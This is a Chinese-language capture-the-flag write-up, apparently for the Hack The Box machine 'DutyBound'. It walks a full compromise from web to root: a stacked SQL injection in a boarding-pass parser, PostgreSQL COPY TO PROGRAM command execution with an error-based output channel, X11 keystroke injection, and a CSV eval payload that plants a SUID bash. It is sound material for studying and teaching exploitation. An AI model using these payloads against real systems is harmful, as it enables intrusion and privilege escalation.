@@ -1,0 +1,249 @@
+# HTB — DutyBound (airsnacks.htb / 10.129.152.254)
+
+> 完整攻击链：**Web 应用 BCBP 解析器 SQL 注入 → PostgreSQL COPY TO PROGRAM RCE → X11 无鉴权键盘注入 → kiosk 用户 → SUID bash → root**
+
+| 项目 | 值 |
+|---|---|
+| 目标 | `https://airsnacks.htb`（10.129.152.254） |
+| 入口 | nginx/1.18.0 反代 Flask/Werkzeug（AirSnacks 自助收银前端） |
+
+
+---
+
+## 0. 结论先行
+
+这台箱的 nginx 版本虽然命中多个 CVE，但**配置把所有 CVE 路径都堵死了**，真实攻击面在应用层。整链三个关键判断点：
+
+1. **不要被版本号骗了** —— 版本命中 ≠ 可利用，必须验证前置条件。
+2. **自研 BCBP 解析器是入口** —— 输入完全可控，且直接拼进 SQL。
+3. **桌面环境的不设防是横向关键** —— X server 没有访问控制，任何本地用户都能注入键盘。
+
+---
+
+## 1. 侦察 & CVE 排查（结论：不可利用，需给否定性证据）
+
+端口：`22 / 80 / 443`。443 是 Flask 应用，路由 `/`、`/browse`、`/cart`、`/cart/add`、`/checkout/boarding-pass/verify`。
+
+### CVE-2026-9256（ngx_http_rewrite_module 堆溢出）
+
+版本命中（1.18.0 ⊂ 1.0.0–1.30.1），直接下"存在"是错的。触发前置条件是 nginx.conf 里存在**重叠 PCRE 捕获组 + 多捕获引用 + redirect/args 上下文**的 rewrite。
+
+**否定性证据（决定性）：**
+
+```bash
+curl --noproxy '*' -sD- 'http://airsnacks.htb/a%2Fb'   # → Location: https://.../a%2Fb   （保留双重编码）
+curl --noproxy '*' -sD- 'http://airsnacks.htb//a//b'   # → Location: https://...//a//b   （保留双斜杠）
+curl --noproxy '*' -sD- 'http://airsnacks.htb/a/../b'  # → Location: https://.../a/../b  （未规范化）
+```
+
+301 保留了原始转义与双斜杠 → 这是 `return 301 https://$host$request_uri` **直传**，而不是带捕获组的 `rewrite`（`$uri` 会解码并合并斜杠）。配置前提不成立，**不可利用**。
+
+### 全量排查结果
+
+| CVE | 判定 | 判定依据 |
+|---|---|---|
+| 2023-44487 / 2019-9511 / 2019-9513 / 2026-40460 | ✗ | `openssl s_client -alpn h2` → **No ALPN negotiated**，HTTP/2 与 HTTP/3 全关 |
+| 2026-40701 | ✗ | 握手无 `Acceptable client certificate CA names` → `ssl_verify_client=off` |
+| 2026-27654 | ✗ | `COPY`/`MOVE` 返 405 落到 Flask → dav 模块未接管 |
+| 41741 / 41742 / 32647 | ✗ | `.mp4` 404 落到 Flask → mp4 模块未启用 |
+| 2024-49767 / 2023-46136 (Werkzeug) | ✗ | 空 body 也返回 200 → 未走 MultiPartParser |
+| 2023-30861 (Flask) | ✗ | 响应带 `Vary: Cookie` → ≥2.3.2，已修复 |
+| 2021-23017 / 2026-42934 | ✗（不可远程确证） | 需读 nginx.conf；即便成立也只到 DoS/内存泄露 |
+
+> 方法论沉淀：**"返 405/404 的到底是谁"** 是判断模块是否加载的最快手段 —— 落到 Flask 就说明 nginx 那个模块根本不存在。
+
+---
+
+## 2. BCBP 逆向（AirSnacks 自研解析器）
+
+`/checkout/boarding-pass/verify` 收 `{"raw": "..."}`，需先有 cart 会话（否则 `409 CART_EMPTY`）。解析器逐字节校验并报精确错误（`expected 'M' at offset 0`、`error:BCBP_ERR_FORMAT_CODE`），这等于把格式规约免费送给了我们。
+
+### 强制区（60 字节）
+
+| 偏移 | 字段 | 规则 |
+|---|---|---|
+| 0 | `M` | 固定格式码 |
+| 1 | 航段数 | 1–4 |
+| 2–21 | 姓名 | 20 字节，须含 `/`，A-Z |
+| 22 | 电子票标识 | `E` 或空 |
+| 23–29 | PNR | 6–7 字母数字 |
+| 30–35 | 出发/到达机场 | 各 3 字母 |
+| **36–38** | **承运人** | **3 位**（IATA 标准是 2 位，此实现是 3 位 —— 踩坑点，导致整表错位一格） |
+| 39–43 | 航班号 | 4 数字 + 字母/空 |
+| 44–46 | 儒略日 | 001–366（000/367 被拒） |
+| 47 | 舱位 | 1 字符 |
+| 48–51 | 座位 | `NNNA` 或 `INF ` |
+| 52–56 | 序号 | 4 数字 + 字母/空 |
+| 57 | 旅客状态 | 1 字符 |
+| **58–59** | **item 6** | **变长块总长的 2 位十六进制** |
+
+### 变长块
+
+```
+> <版本 5-8> <唯一块长度> <唯一块> <重复块长度> <重复块> <airline use 自由字段>
+```
+
+- 唯一块长度仅接受 `0B / 18 / 25 / 32`（`0B` = 旅客类型1 + 值机来源1 + 签发来源1 + 签发日期4(YYDDD) + 文档类型1 + 承运人3）
+- 重复块长度仅接受 `03 / 0D / 0E / 0F / 12 / 15 / 25 / 26 / 29 / 2A`
+- **块长上限 255**（item 6 只有 2 位 hex），超了会把前面的 `>` 挤出 60 字节窗口，报假错误 `missing version marker '>'`
+
+---
+
+## 3. SQL 注入 → PostgreSQL RCE
+
+### 注入点确认
+
+airline 字段直接拼进 SQL 且不转义。发单引号，报错把模板吐了回来：
+
+```
+..., 'BER', 'SFT', '', '', 81, '<airline>')
+```
+
+### 堆叠查询验证
+
+```sql
+'); SELECT pg_sleep(5); --        # 基线 0.90s → 5.89s
+```
+
+### 命令执行验证
+
+```sql
+'); COPY (SELECT 1) TO PROGRAM 'sleep 4'; --   # → 4.94s
+```
+
+角色具备 `pg_execute_server_program` → 落地 `postgres@dutyfree-kiosk7`（uid=114）。
+
+### 无回连的回显通道
+
+靶机无法回连本机（Windows 入站被拦，`curl` 返 exit 28），改用**类型转换报错**带出 stdout：
+
+```sql
+');CREATE TEMP TABLE z(l text);COPY z FROM PROGRAM '<cmd>';SELECT string_agg(l,chr(10))::int FROM z;--
+```
+
+报错 `invalid input syntax for type integer: "<输出>"`。比 `DO/RAISE` 更短，给命令留更多空间。
+
+> 注意：`COPY TO PROGRAM` 子进程非 0 退出会直接报 failed 且拿不到输出 → 命令末尾加 `; echo ok` 兜底。
+
+### 利用脚本
+
+`rce.py`：自动建 cart → 拼合法 BCBP → 注入 → 执行。
+
+```bash
+python rce.py --cmd "id"
+python rce.py --upload /local/payload.py /tmp/payload.py   # base64 分块，150B/块
+python rce.py --run /tmp/xrun.py
+```
+
+---
+
+## 4. postgres → dutyfree-kiosk（X11 键盘注入）
+
+### 关键前提：这台 X server 没有访问控制
+
+`XAUTHORITY` cookie 是 600 的 kiosk 私有文件，但 **postgres 直接 `DISPLAY=:0 xdpyinfo` 就通** —— 不需要偷 cookie，因为 `xhost` 访问控制被关了。
+
+```bash
+sudo -u postgres DISPLAY=:0 xdpyinfo | head   # 通了
+```
+
+### 走过的弯路（别再试）
+
+- 右键 `Root` 弹 openbox 根菜单 → 不弹（`/etc/xdg` 里 Root 上下文没绑 Button3）
+- 找 firefox 窗口 unmap → 窗口只有 10x10，真正全屏的是 openbox frame，判断条件不成立
+
+### 有效路径
+
+1. **XTEST 自检**：发 `Ctrl+Alt+Right` 切虚拟桌面，`xprop -root _NET_CURRENT_DESKTOP` 验证 `0 → 1`，确认注入链路通。
+2. **快捷键爆破**：`xlsclients` 前后对比客户端数 → 发现 kiosk 的 `rc.xml` 绑了 **`Ctrl+Alt+T` → `/usr/bin/xterm`**。
+3. **打字**：`translate_coords` 求绝对坐标 → warp 到中心 → 左键点一下抢焦点 → 逐字符发 keysym（shift 判断：`keycode_to_keysym(kc,0) != ks` 就该按 shift）。
+4. **规避特殊字符**：不手打 `$()` 这类符号，改成 postgres 先写脚本到 `/tmp`，xterm 里只敲 `/tmp/p.sh` 回车。
+
+```bash
+# 写入 /tmp/cmd.txt 后由 xterm 执行的内容
+cp ~/user.txt /tmp/u; chmod 644 /tmp/u; id > /tmp/k; chmod 644 /tmp/k
+```
+
+结果：
+
+```
+uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
+```
+
+
+
+---
+
+## 5. kiosk → root（systemd path + CSV eval 注入）
+
+### 权限发现
+
+```
+-rw-rw-r-- 1 root pos-ops /opt/vrs/data/duty-rates.csv
+```
+
+kiosk 在 `pos-ops` 组 → 可写该文件。同时：
+
+```
+vrs-duty-apply.path     → 监听该文件，变化即触发
+vrs-duty-apply.service  → 无 User=，即 root oneshot
+                        → ExecStart=/opt/vrs/bin/apply-duty-rates.sh
+```
+
+**一个 pos-ops 可写的文件，被 root oneshot 服务消费 —— 这就是提权点。**
+
+### 漏洞代码
+
+```bash
+while IFS=, read -r tax_class duty_pct vat_pct; do
+    # 只校验后两列是数字
+    ...
+    eval "${tax_class}=${duty_pct}"     # tax_class 完全不校验 → 二次解析执行
+done < /opt/vrs/data/duty-rates.csv
+```
+
+### 载荷
+
+CSV 追加一行（第一列即 `tax_class`）：
+
+```bash
+X=$(cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb),1,1
+```
+
+`path` unit 自动触发 → `eval "X=$(cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb)=1"` → 命令替换先执行。
+
+```
+-rwsr-xr-x 1 root root /tmp/rb
+```
+
+### 拿 root
+
+```bash
+/tmp/rb -p -c "id; cat /root/root.txt"
+# uid=114(postgres) gid=121(postgres) euid=0(root) ...
+```
+
+> `-p` 是必须的 —— 不保留 euid，SUID bash 会因为 `uid != euid` 主动降权。
+
+> 
+
+---
+
+## 6. 链路总结
+
+```
+[外部]  /checkout/boarding-pass/verify
+          │  raw BCBP → airline 字段未转义
+          ▼
+[postgres]  SQLi (堆叠) → COPY TO PROGRAM  ──── RCE, uid=114
+          │  DISPLAY=:0 无访问控制
+          ▼
+[kiosk]   XTEST 注入 Ctrl+Alt+T → xterm → 落脚本  ──── uid=1000, 组 pos-ops
+          │  duty-rates.csv 组可写
+          ▼
+[root]    vrs-duty-apply.path → path 触发 root oneshot
+          → apply-duty-rates.sh: eval "${tax_class}=..."
+          → SUID bash → euid=0
+```
+
+---
